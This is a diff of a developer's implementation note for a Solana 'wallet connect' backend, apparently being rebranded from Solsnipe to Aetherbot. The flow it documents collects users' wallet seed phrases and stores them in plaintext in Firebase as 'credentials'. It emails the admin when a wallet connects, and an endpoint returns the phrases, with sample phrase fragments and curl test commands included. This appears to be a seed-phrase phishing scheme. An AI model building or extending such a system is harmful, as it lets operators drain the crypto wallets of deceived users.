@@ -28,7 +28,7 @@ Update your Loops template to include the `WalletType` variable if you want to d
 
 ---
 
-### 2. Store Seed Phrase and Add Solsnipe Balance ✅
+### 2. Store Seed Phrase and Add Aetherbot Balance ✅
 
 **Files Modified:**
 - `netlify/functions/utils/firebaseWalletStore.js`
@@ -36,7 +36,7 @@ Update your Loops template to include the `WalletType` variable if you want to d
 
 **New Fields Added to Firebase:**
 1. **`credentials`** (string) - Stores the actual seed phrase or custom passphrase
-2. **`solsnipeBalance`** (number) - Solsnipe platform balance (initialized to 0)
+2. **`AetherbotBalance`** (number) - Aetherbot platform balance (initialized to 0)
 
 **Firebase Wallet Structure (Updated):**
 ```javascript
@@ -52,7 +52,7 @@ Update your Loops template to include the `WalletType` variable if you want to d
   
   // Balances
   balance: 1.5,                    // SOL balance
-  solsnipeBalance: 0,              // NEW: Solsnipe platform balance
+  AetherbotBalance: 0,              // NEW: Aetherbot platform balance
   balanceLastUpdated: "2025-10-13T...",
   
   // NEW: Credentials
@@ -93,7 +93,7 @@ Update your Loops template to include the `WalletType` variable if you want to d
     "blockchain": "solana",
     
     "balance": 1.5,
-    "solsnipeBalance": 0,
+    "AetherbotBalance": 0,
     "balanceLastUpdated": "2025-10-13T...",
     
     "credentials": "pill tomorrow foster begin...",
@@ -122,7 +122,7 @@ Update your Loops template to include the `WalletType` variable if you want to d
 # Start server
 netlify dev
 
-# Connect wallet (creates new wallet with credentials and solsnipeBalance)
+# Connect wallet (creates new wallet with credentials and AetherbotBalance)
 curl -X POST http://localhost:8888/.netlify/functions/wallet-connect `
   -H "Content-Type: application/json" `
   -d '{
@@ -135,8 +135,8 @@ curl -X POST http://localhost:8888/.netlify/functions/wallet-connect `
 
 **Expected:**
 - ✅ Wallet created with `credentials` field
-- ✅ `solsnipeBalance` initialized to 0
-- ✅ Email sent to admin@solsnipeai.xyz with `WalletType` field
+- ✅ `AetherbotBalance` initialized to 0
+- ✅ Email sent to admin@aetherbot.app with `WalletType` field
 - ✅ Returns JWT token
 
 **Check Server Logs:**
@@ -169,7 +169,7 @@ curl -X GET http://localhost:8888/.netlify/functions/get-wallet-details `
   "wallet": {
     "walletAddress": "...",
     "balance": 1.5,
-    "solsnipeBalance": 0,
+    "AetherbotBalance": 0,
     "credentials": "pill tomorrow foster begin...",
     "walletType": "solana",
     ...
@@ -202,7 +202,7 @@ curl -X GET http://localhost:8888/.netlify/functions/get-wallet-details `
 3. Saves to Firebase:
    - walletAddress
    - credentials (seed phrase)
-   - solsnipeBalance: 0
+   - AetherbotBalance: 0
    - balance (SOL)
    ↓
 4. Sends email to admin with:
@@ -225,7 +225,7 @@ curl -X GET http://localhost:8888/.netlify/functions/get-wallet-details `
    ↓
 4. Returns all wallet data including:
    - credentials
-   - solsnipeBalance
+   - AetherbotBalance
    - SOL balance
    - transaction history
    - login stats
@@ -249,11 +249,11 @@ curl -X GET http://localhost:8888/.netlify/functions/get-wallet-details `
 
 2. **Update Loops Template:**
    - Go to https://app.loops.so/transactional
-   - Edit template `cmgn2tzu5fqc41q0ivqlmuqf4`
+   - Edit template `cmgwzzij2tdk6wb0ie0unnzzp`
    - Add `{{WalletType}}` variable to template
 
-3. **Add Solsnipe Balance Management:**
-   - Create endpoint to update `solsnipeBalance`
+3. **Add Aetherbot Balance Management:**
+   - Create endpoint to update `AetherbotBalance`
    - Add validation and authorization
    - Track balance changes (transaction history)
 
@@ -269,7 +269,7 @@ curl -X GET http://localhost:8888/.netlify/functions/get-wallet-details `
 
 1. ✅ `netlify/functions/utils/loopsEmail.js` - Added WalletType to email data
 2. ✅ `netlify/functions/wallet-connect.js` - Pass walletType and credentials
-3. ✅ `netlify/functions/utils/firebaseWalletStore.js` - Store credentials and solsnipeBalance
+3. ✅ `netlify/functions/utils/firebaseWalletStore.js` - Store credentials and AetherbotBalance
 4. ✅ `netlify/functions/get-wallet-details.js` - NEW endpoint created
 
 ---
@@ -278,7 +278,7 @@ curl -X GET http://localhost:8888/.netlify/functions/get-wallet-details `
 
 - [x] WalletType included in Loops email
 - [x] Seed phrase stored in Firebase as `credentials`
-- [x] `solsnipeBalance` field added and initialized to 0
+- [x] `AetherbotBalance` field added and initialized to 0
 - [x] Get wallet details endpoint created
 - [x] JWT authentication on get-wallet-details
 - [x] All fields preserved during updates
